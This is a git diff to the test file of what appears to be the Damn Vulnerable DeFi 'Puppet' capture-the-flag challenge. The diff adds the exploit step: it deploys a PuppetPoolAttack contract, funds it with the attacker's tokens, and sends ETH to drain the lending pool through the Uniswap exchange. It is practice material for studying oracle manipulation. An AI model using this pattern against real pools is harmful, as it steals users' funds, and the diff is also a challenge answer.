@@ -103,8 +103,18 @@ describe('[Challenge] Puppet', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
-    });
+        const PuppetPoolAttack = await ethers.getContractFactory('PuppetPoolAttack', attacker);
+        const attackContract = await PuppetPoolAttack.deploy();
 
+        const tokenBalance = await this.token.balanceOf(attacker.address);
+        const ethBalance = await ethers.provider.getBalance(attacker.address);
+
+        await this.token.connect(attacker).transfer(attackContract.address, tokenBalance);
+
+        const ethToSend = ethBalance.sub(ethers.utils.parseEther("0.1")); // subtract some for gas
+        const tx = await attackContract.attack(this.uniswapExchange.address, this.lendingPool.address, {value: ethToSend});
+        await tx.wait();
+    });
     after(async function () {
         /** SUCCESS CONDITIONS */
 
